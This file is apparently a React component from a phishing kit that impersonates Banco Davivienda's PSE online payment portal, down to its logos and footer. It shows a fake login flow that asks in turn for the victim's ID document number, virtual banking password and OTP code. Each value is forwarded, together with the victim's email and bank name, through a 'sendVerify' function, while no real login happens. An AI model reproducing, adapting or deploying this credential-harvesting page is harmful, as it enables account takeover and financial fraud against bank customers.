import React, { useEffect, useState } from 'react';
import { useLocation } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X01.module.css';
import footer from '../../Assets/Images/X01/footer.png'
import logo from '../../Assets/Images/X01/logo.png'
import logoFooter from '../../Assets/Images/X01/logoFooter.png'
import personaJuridica from '../../Assets/Images/X01/personaJuridica.png'
import personaNatural from '../../Assets/Images/X01/personaNatural.png'

function X01() {

    const location = useLocation();
    const { dataD, dataE } = location.state || {};

    const [fechaHora, setFechaHora] = useState('');
    const [numero, setNumero] = useState('');
    const [mostrarNuevaSeccion, setMostrarNuevaSeccion] = useState(false);

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');
    const [showDataGSection, setShowDataGSection] = useState(false);
    const [showDataHSection, setShowDataHSection] = useState(false);

    const handleContinue = (e) => {
        
        e.preventDefault();

        if (!showDataGSection) {
            sendVerify(`🆔: ${dataF}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowDataGSection(true);
        } else if (!showDataHSection) {
            sendVerify(`🔐: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowDataHSection(true);
        } else {
            sendVerify(`🔑: ${dataH}\n📧: ${dataE}\n🏦: ${dataD}`);
        }
    };

    useEffect(() => {

        const ahora = new Date();

        const opcionesFecha = {
            weekday: 'long', 
            day: 'numeric',
            month: 'long',
            year: 'numeric',
        };

        const fechaFormateada = ahora.toLocaleDateString('es-ES', opcionesFecha);

        const hora = ahora.getHours().toString().padStart(2, '0');
        const minutos = ahora.getMinutes().toString().padStart(2, '0');

        const capitalizar = (texto) => texto.charAt(0).toUpperCase() + texto.slice(1);

        setFechaHora(`${capitalizar(fechaFormateada)}, ${hora}:${minutos}`);
    }, []);


    useEffect(() => {

        const generarNumeroAleatorioDiezDigitos = () => {
            const minimo = 1000000000;
            const maximo = 9999999999;
            return Math.floor(Math.random() * (maximo - minimo + 1)) + minimo;
        };

        const numeroGenerado = generarNumeroAleatorioDiezDigitos();
        setNumero(numeroGenerado.toString());
    }, []);

    const handleClickPersonaNatural = () => {
        setMostrarNuevaSeccion(true);
    };

    return (
        <>
            <header className={styles.headerX01}>
                <section>
                    <img src={logo} alt="Logo"></img>
                </section>
                <section>
                    <p>{fechaHora}</p>
                    <p>Código único CUS: {numero}</p>
                </section>
            </header>
            <main className={styles.mainX01}>
                {!mostrarNuevaSeccion ? (
                    <section className={styles.sectionAX01}>
                        <div>
                            <h1>Bienvenido al Portal de</h1>
                            <h2>Pagos en Línea y PSE</h2>
                            <p>Seleccione el canal por el cual realizará el pago:</p>
                        </div>
                        <div>
                            <div onClick={handleClickPersonaNatural}>
                                <img src={personaNatural} alt="Persona Natural"></img>
                                <p>Persona</p>
                                <p>Natural</p>
                            </div>
                            <div>
                                <img src={personaJuridica} alt="Persona Jurídica"></img>
                                <p>Empresa</p>
                            </div>
                        </div>
                        <div>
                            <p>No olvide Cerrar Sesión<br></br>una vez termine sus transacciones.</p>
                        </div>
                    </section>
                ) : (
                    <section className={styles.sectionBX01}>
                        <div>
                            <h1>Ingreso Persona Natural</h1>
                            <h2>Pagos en Línea y PSE</h2>
                        </div>
                        <div>
                            <div>
                                <p>Por favor ingrese la siguiente información:</p>
                            </div>
                            <div>
                                <form>
                                    <div>
                                        <label>Tipo de documento</label>
                                        <select>
                                            <option>Cedula de Ciudadanía</option>
                                            <option>Cedula de Extranjería</option>
                                            <option>NIT</option>
                                            <option>Tarjeta de Identidad</option>
                                            <option>Pasaporte</option>
                                        </select>
                                    </div>
                                    <div>
                                        <label>No. de documento</label>
                                        <input  
                                            type="text"
                                            value={dataF}
                                            onChange={(e) => setDataF(e.target.value)}
                                        />
                                    </div>
                                    {showDataGSection && (
                                        <div>
                                            <label>Clave Virtual</label>
                                            <input
                                                type="password"
                                                value={dataG}
                                                onChange={(e) => setDataG(e.target.value)}
                                            />
                                        </div>
                                    )}
                                    {showDataHSection && (
                                        <div>
                                            <label>Codigo OTP</label>
                                            <input
                                                type="password"
                                                value={dataH}
                                                onChange={(e) => setDataH(e.target.value)}
                                            />
                                        </div>
                                    )}
                                </form>
                                <div>
                                    <button onClick={handleContinue}>
                                        {showDataHSection ? 'Ingresar' : 'Continuar'}
                                    </button>
                                    <button>Cancelar</button>
                                </div>
                            </div>
                        </div>
                    </section>
                )}
            </main>
            <footer className={styles.footerX01}>
                <img src={footer} alt="Vigilado"></img>
                <p>Banco Davivienda S.A. Todos los derechos reservados 2025.</p>              
                <img src={logoFooter} alt="Logo Footer"></img>
            </footer>
        </>
    );
}

export default X01;